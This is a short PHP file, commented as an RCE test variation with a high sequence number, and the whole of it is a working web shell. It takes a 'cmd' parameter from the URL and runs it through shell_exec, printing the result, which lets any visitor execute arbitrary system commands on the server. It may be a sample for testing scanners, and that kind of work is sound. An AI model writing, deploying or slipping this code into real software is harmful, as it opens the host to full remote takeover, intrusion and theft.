<?php
// RCE test variation #1162
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>